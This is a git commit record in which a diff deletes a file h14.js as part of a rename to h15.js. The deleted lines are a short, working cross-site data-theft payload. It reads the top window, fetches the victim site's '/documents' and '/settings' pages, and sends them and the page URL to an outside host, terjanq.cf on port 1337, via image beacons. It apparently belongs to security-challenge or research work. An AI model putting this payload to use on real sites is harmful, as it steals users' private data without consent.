a3b5d7eacd842ac93a82f4b1f719c30bdcbbe702
terjanq <terjanq@users.noreply.github.com>
2020-01-22 22:41:43 +0100

    Update and rename h14.js to h15.js

--- h14.js
+++
@@ -1,8 +0,0 @@
-d=window.top.document;
-w=window.top;
-function sendData(data, what='xxx'){
-(new Image()).src=`http://terjanq.cf:1337/?${what}${encodeURIComponent(data)}`;
-}
-sendData(w.location.href, 'location=');
-fetch('/documents').then(e=>e.text()).then(e=>sendData(e, 'documents'));
-fetch('/settings').then(e=>e.text()).then(e=>sendData(e, 'settings'));
